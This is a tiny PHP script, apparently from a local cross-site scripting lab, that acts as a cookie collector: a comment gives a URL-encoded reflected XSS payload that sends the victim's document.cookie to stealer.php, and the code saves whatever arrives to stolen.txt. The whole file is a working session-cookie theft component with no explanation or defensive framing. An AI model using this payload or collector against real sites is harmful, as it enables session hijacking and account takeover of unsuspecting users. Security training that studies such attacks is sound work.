<?php

//http://127.0.0.1/Nine%20XSS/Session%20Management/session-one/attack/?name=%3Cscript%3Edocument.location=(%22http://127.0.0.1/Nine%20XSS/Session%20Management/session-one/attack/stealer.php?cookies=%22.concat(document.cookie));%3C/script%3E

$file = 'stolen.txt'; ;
file_put_contents($file, $_GET["cookies"]);
?>